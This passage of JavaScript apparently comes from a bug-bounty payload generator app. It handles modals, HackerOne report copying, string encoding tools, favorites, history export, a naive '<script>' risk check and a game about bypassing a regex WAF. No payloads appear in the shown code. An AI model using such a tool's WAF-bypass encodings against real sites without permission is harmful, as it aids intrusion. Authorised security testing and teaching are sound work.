      modal.addEventListener("click", (e) => {
        if (e.target === modal) window.closeModals();
      });
    }
  });

  document.getElementById("btn-modal-toolbox").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalToolbox.style.display = "flex"; });
  document.getElementById("btn-modal-fav").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalFav.style.display = "flex"; renderFavModal(); });
  document.getElementById("btn-modal-history").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalHistory.style.display = "flex"; renderHistoryModal(); });
  
  document.getElementById("btn-modal-report").addEventListener("click", (e) => {
    e.preventDefault();
    closeModals();
    modalReport.style.display = "flex";
    document.getElementById("report-output").textContent = buildHackerOneReport();
  });

  document.getElementById("btn-copy-report").addEventListener("click", () => {
    navigator.clipboard.writeText(document.getElementById("report-output").textContent).then(() => {
      showToast("HackerOne Report copied! 📄");
    });
  });

  document.getElementById("btn-modal-sandbox").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalSandbox.style.display = "flex"; });
  document.getElementById("btn-modal-game").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalGame.style.display = "flex"; initWafGame(); });

  const sandboxInput = document.getElementById("sandbox-input");
  const sandboxOutput = document.getElementById("sandbox-analysis-output");
  if (sandboxInput) {
    sandboxInput.addEventListener("input", () => {
      const str = sandboxInput.value;
      if (!str) {
        sandboxOutput.innerHTML = `<span style="color:var(--text-muted);">Type string above...</span>`;
        return;
      }
      const hasScript = str.includes("<script>") || str.includes("alert(");
      sandboxOutput.innerHTML = `<div><strong style="color:${hasScript ? '#f87171' : '#4ade80'};">Risk Score: ${hasScript ? 'HIGH RISK' : 'LOW RISK'}</strong></div><div>Analyzed: <code>${escapeHtml(str)}</code></div>`;
    });
  }

  let currentXp = 100;
  function initWafGame() {
    document.getElementById("game-rule-title").textContent = "Challenge #01: Bypass Naive Regex WAF";
    document.getElementById("game-rule-desc").textContent = "The target WAF strictly blocks raw '<script>' tags. Select a Filter or Alternative Context!";
    document.getElementById("game-xp-count").textContent = `${currentXp} XP`;
    document.getElementById("game-feedback").textContent = "";
  }

  document.getElementById("btn-submit-game").addEventListener("click", () => {
    const filter = filterEl.value;
    if (filter !== 'none') {
      currentXp += 50;
      document.getElementById("game-xp-count").textContent = `${currentXp} XP`;
      document.getElementById("game-feedback").innerHTML = `<span style="color:#4ade80; font-weight:bold;">🎉 SUCCESS! Bypassed WAF (+50 XP)!</span>`;
    } else {
      document.getElementById("game-feedback").innerHTML = `<span style="color:#f87171;">❌ FAILED! Select a Filter or Encoding!</span>`;
    }
  });

  function renderFavModal() {
    const favs = getFavorites();
    const container = document.getElementById("fav-list-container");
    if (!container) return;
    if (favs.length === 0) {
      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No favorites saved yet. Click ⭐ on any payload!</div>`;
      return;
    }
    container.innerHTML = favs.map(code => `
      <div class="list-item-row">
        <span class="list-item-code">${escapeHtml(code)}</span>
        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
      </div>
    `).join('');
  }

  function renderHistoryModal() {
    const hist = getHistory();
    const container = document.getElementById("history-list-container");
    if (!container) return;
    if (hist.length === 0) {
      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No generation history yet.</div>`;
      return;
    }
    container.innerHTML = hist.map(item => `
      <div class="list-item-row">
        <div>
          <div style="font-size:0.75rem; color:var(--accent-cyan);">${item.vClass.toUpperCase()} - ${item.vAction} <span style="color:#64748b;">(${item.time})</span></div>
          <span class="list-item-code">${escapeHtml(item.code)}</span>
        </div>
        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(item.code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
      </div>
    `).join('');
  }

  const tbInput = document.getElementById("toolbox-input");
  const tbB64 = document.getElementById("toolbox-b64");
  const tbUrl = document.getElementById("toolbox-url");
  const tbHex = document.getElementById("toolbox-hex");
  const tbHtml = document.getElementById("toolbox-html");

  if (tbInput) {
    tbInput.addEventListener("input", () => {
      const val = tbInput.value;
      if (!val) {
        tbB64.value = tbUrl.value = tbHex.value = tbHtml.value = "";
        return;
      }
      try { tbB64.value = btoa(unescape(encodeURIComponent(val))); } catch(e) { tbB64.value = "Error"; }
      tbUrl.value = encodeURIComponent(val);
      tbHex.value = val.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
      tbHtml.value = val.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
    });
  }

  const btnExp = document.getElementById("btn-export-all");
  if (btnExp) {
    btnExp.addEventListener("click", (e) => {
      e.preventDefault();
      const data = { currentPayload: currentGeneratedPayload, favorites: getFavorites(), history: getHistory() };
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "bba_payload_pro_suite.json";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    });
  }

  generateAndSimulate();
});
